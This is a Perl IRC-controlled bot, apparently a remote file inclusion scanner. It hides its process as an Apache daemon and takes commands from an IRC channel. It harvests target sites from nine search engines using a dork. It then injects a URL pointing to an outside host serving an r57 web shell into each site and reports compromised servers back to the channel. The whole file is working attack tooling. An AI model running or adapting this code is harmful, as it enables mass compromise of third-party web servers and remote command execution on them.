#!/usr/bin/perl
#Mic22 Is Here!

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

my $processo = "/usr/local/apache/bin/httpd -DSSL";
my $cmd="http://oon.web.id/r57?";
my $server="irc.milw0rm.com";
my $porta="6667";
my $nick="[Rfi]";
my $canale="#army";
my $verbot = "6.51";
my @adms=("joiner");
my $pid=fork;
exit if $pid;
$0="$processo"."\0"x16;
my $sk = IO::Socket::INET->new(PeerAddr=>"$server",PeerPort=>"$porta",Proto=>"tcp") or die "Can not connect on server!\n";
$sk->autoflush(1);
print $sk "NICK $nick\r\n";
print $sk "USER joiner 13 *  : ScanBotPhp : joiner :henca\r\n";
print $sk "JOIN $canale\r\n";

while($line = <$sk>){

$line =~ s/\r\n$//;
if ($line=~ /^PING \:(.*)/)
{
print "PONG :$1";
print $sk "PONG :$1";
}

if ($line=~ /PRIVMSG $canale :.out/){
stampa($sk, "QUIT");
}


if ($line=~ /PRIVMSG $canale :.help/){
stampa($sk, "PRIVMSG $canale :12.::[13Bantuan] 6Scanner RFI Ver $verbot (C)Mic22 , 3Colorido Por 10Joiner12::.");
stampa($sk, "PRIVMSG $canale :12.::[13Bantuan] 2ketik 4.scan Bug Dork 12::.");
stampa($sk, "PRIVMSG $canale :12.::[13Bantuan] 2Ketik 7.engine 2Untuk melihat searce engine yang digunakan 12::.");
stampa($sk, "PRIVMSG $canale :12.::[13bantuan] 2Ketik 7.mwultimi 2Untuk Melihat Bug di milworm 12::.");
stampa($sk, "PRIVMSG $canale :12.::[13Bantuan] 2Ketik 7.info 2Untuk Melihat status Bot/System 12::.");
stampa($sk, "PRIVMSG $canale :12.::[13Bantuan] 2Ketik 7.out 2Untuk Matikan Bot 12::.");
}

if ($line=~ /PRIVMSG $canale :.info/){
my $sysos = `uname -sr`;
my $uptime = `uptime`;
if ($sysos =~ /freebsd/i ) {
$sysname = `hostname`;
$memory = `expr \`cat /var/run/dmesg.boot | grep "real memory" | cut -f5 -d" "\` \/ 1048576`; 
$swap = `$toploc | grep -i swap | cut -f2 -d" " | cut -f1 -d"M"`;
chomp($memory);
chomp($swap);
}
elsif ( $sysos =~ /linux/i ) {
$sysname = `hostname -f`;
$memory = `free -m |grep -i mem | awk '{print \$2}'`;
$swap = `free -m |grep -i swap | awk '{print \$2}'`;
chomp($swap);
chomp($memory);
}
else {
$sysname ="No Found";; 
$memory ="No found";
$swap ="No Found";
}
$uptime=~s/\n//g;
$sysname=~s/\n//g;
$sysos=~s/\n//g;
stampa($sk, "PRIVMSG $canale :12.::[%C9Info] Server: $server :| - $porta12::.");
stampa($sk, "PRIVMSG $canale :12.::[%C9Info] SO/Hostname:12 $sysos - $sysname12::."); 
stampa($sk, "PRIVMSG $canale :12.::[%C9Info] Process/PID:12 $processo - $$12::.");
stampa($sk, "PRIVMSG $canale :12.::[%C9Info] Uptime:12 $uptime12::."); 
stampa($sk, "PRIVMSG $canale :12.::[%C9Info] Memory/Swap:12 $memory - $swap12::.");
stampa($sk, "PRIVMSG $canale :12.::[%C9Info] Perl Version/BOT:12 $] - $verbot12::."); 
}


if ($line=~ /PRIVMSG $canale :.engine/){
stampa($sk, "PRIVMSG $canale :12.::[%C9Engine] 2Google, Yahoo, MsN, Altavista, Libero, AllTheWeb, AsK, UoL, AoL 12::.");
}

if ($line=~ /PRIVMSG $canale :.mwultimi/){
my @ltt=();
my @bug=();
my $x; 
my $page="";
my $socke = IO::Socket::INET->new(PeerAddr=>"milw0rm.com",PeerPort=>"80",Proto=>"tcp") or return; 
print $socke "GET http://milw0rm.com/rss.php HTTP/1.0\r\nHost: milw0rm.com\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n"; 
my @r = <$socke>;
$page="@r";
close($socke); 
while ($page =~  m/<title>(.*)</g){
$x = $1;
if ($x =~ /\&lt\;/) {
$x =~ s/\&lt\;/</g;
}
if ($x !~ /milw0rm/) {
push (@bug,$x);
}}
while ($page =~  m/<link.*expl.*([0-9]...)</g) { 
if ($1 !~ m/milw0rm.com|exploits|en/){
push (@ltt,"http://www.milw0rm.com/exploits/$1 ");
}}
stampa($sk, "PRIVMSG $canale :12.::[%C9MillW0rm] 7 Últimos Bugs do milw0rm 12::."); 
foreach $x (0..(@ltt - 1)) {
stampa($sk, "PRIVMSG $canale :12.::[%C9MillW0rm] Lista de Bugs Milw0rm $bug[$x] - $ltt[$x] 12::.");
sleep 1;
}}

if ($line=~ /PRIVMSG $canale :.scan\s+(.*?)\s+(.*)/){
if (my $pid = fork) {
waitpid($pid, 0);
} else {
if (fork) {
exit;
} else {
my $bug=$1;
my $dork=$2;
my $contatore=0;
my ($type,$space);
my %hosts;
stampa($sk, "PRIVMSG $canale :12.::[%C9Dork] $dork12::.");
stampa($sk, "PRIVMSG $canale :12.::[%C9Bug] $bug12::.");
stampa($sk, "PRIVMSG $canale :12.::[%C9Lendo] 2Aguarde...12::.");
stampa($sk, "PRIVMSG $canale :12.::[%C9Google]%C3 Buscando sites no provedor...12::.");
my @glist=&google($dork);
stampa($sk, "PRIVMSG $canale :12.::[%C9Yahoo]%C3 Buscando sites no provedor...12::.");
my @ylist=&yahoo($dork);
stampa($sk, "PRIVMSG $canale :12.::[%C9Msn]%C3 Buscando sites no provedor...12::.");
my @mlist=&msn($dork);
stampa($sk, "PRIVMSG $canale :12.::[%C9Altavista]%C3 Buscando sites no provedor...12::.");
my @alist=&altavista($dork);
stampa($sk, "PRIVMSG $canale :12.::[%C9Libero]%C3 Buscando sites no provedor...12::.");
my @llist=&libero($dork);
stampa($sk, "PRIVMSG $canale :12.::[%C9AllTheWeb]%C3 Buscando sites no provedor...12::.");
my @allist=&alltheweb($dork);
stampa($sk, "PRIVMSG $canale :12.::[%C9AsK]%C3 Buscando sites no provedor...12::.");
my @asklist=&ask($dork);
stampa($sk, "PRIVMSG $canale :12.::[%C9UoL]%C3 Buscando sites no provedor...12::.");
my @uollist=&uol($dork);
stampa($sk, "PRIVMSG $canale :12.::[%C9AoL]%C3 Buscando sites no provedor...12::.");
my @aollist=&aol($dork);
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] 2Analisando procedimentos.. [9Dork] $dork12::.");
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] %C7Google ".scalar(@glist)." Sites!12::.");
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] %C7Yahoo ".scalar(@ylist)." Sites!12::.");
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] %C7MsN ".scalar(@mlist)." Sites!12::.");
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] %C7Altavista ".scalar(@alist)." Sites!12::.");
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] %C7Libero ".scalar(@llist)." Sites!12::.");
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] %C7All-The-Web ".scalar(@allist)." Sites!12::.");
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] %C7Ask ".scalar(@asklist)." Sites!12::.");
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] %C7UoL ".scalar(@uollist)." Sites!12::.");
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] %C7AoL ".scalar(@aollist)." Sites!12::.");
push(my @tot, @glist, @ylist, @mlist, @alist, @llist, @allist,@asklist,@uollist,@aollist);
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] 12Total Escaneado 9,1R1,9F9,1I1,9  ".scalar(@tot)." Sites!12::.");
my @puliti=&unici(@tot);
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] 7Total Encontrado 9,1R1,9F9,1I1,9 ".scalar(@puliti)." Sites!12::.");
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] Iniciando o Teste de Vulnerabilidade...9,1R1,9F9,1I1,9 Scan!12::.");
my $uni=scalar(@puliti);
foreach my $sito (@puliti)
{
$contatore++;
if ($contatore %30==0){ 
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] Testando... ".$contatore." de ".$uni. " sites12::.");
}
if ($contatore==$uni-1){
stampa($sk, "PRIVMSG $canale :12.::[9,1R1,9F9,1I1,9] Finalizado [%C9Dork] $dork9::."); %C4  POWERED BY JOINER%C4
}
my $test="http://".$sito.$bug.$cmd."?";
my $print="http://".$sito.$bug."http://oon.web.id/r57?"."?";
my $req=HTTP::Request->new(GET=>$test);
my $ua=LWP::UserAgent->new();
$ua->timeout(5);
my $response=$ua->request($req);
if ($response->is_success) {
my $re=$response->content;
if($re =~ /Mic22/ && $re =~ /uid=/){
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
stampa($sk, "PRIVMSG $canale :12.::[13Safe_Mode(12 OFF ) 4Sistema(7 $type ) 6Livre(14 $space )] $print12::.");
stampa($sk, "PRIVMSG MoKu :13.::[12Safe_Mode(4 OFF ) 7Sistema(6 $type ) 14Livre(6 $space )] $print12::.");
}}
elsif($re =~ /Mic22/)
{
my $hs=geths($print); $hosts{$hs}++;
if($hosts{$hs}=="1"){
$x=os($test);
($type,$space)=split(/\,/,$x);
stampa($sk, "PRIVMSG $canale :12.::[2Safe_Mode(4 ON ) 6Sistema(7 $type ) 7Livre(6 $space )] $print12::.");
}}
}}}
exit;
}}}


sub stampa()
{
if ($#_ == '1') {
my $sk = $_[0];
print $sk "$_[1]\n";
} else {
print $sk "$_[0]\n";
}}

sub os(){
my $sito=$_[0];
my $Res=query($sito);
my $type;
my $free;
my $str;
while($Res=~m/<br>OSTYPE:(.+?)\<br>/g){
$type=$1;
}
while($Res=~m/<br>Free:(.+?)\<br>/g){
$free=$1;
}
$str=$type.",".$free;
return $str;
}


sub aol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $AoL=("http://search.aol.com/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub google(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $Go=("http://www.google.co.id/search?hl=id&q=".key($key)."&num=100&filter=0&start=".$b);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://search.yahoo.com/search?ei=UTF-8&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<em class=yschurl>(.+?)\<\/em>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub libero(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0,$pg=0; $i<=1000; $i+=10,$pg++)
{
my $Lib=("http://arianna.libero.it/search/abin/integrata.cgi?s=1&pag=".$pg."&start=".$i."&query=".key($key));
my $Res=query($Lib);
while($Res =~ m/<a class=\"testoblu\" href=\"?http:\/\/([^>\"]*)\//g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub alltheweb()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub uol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i);
my $Res=query($UoL);
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
my $k=$1;
if($k!~/busca|uol|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}   
return @unici;
}
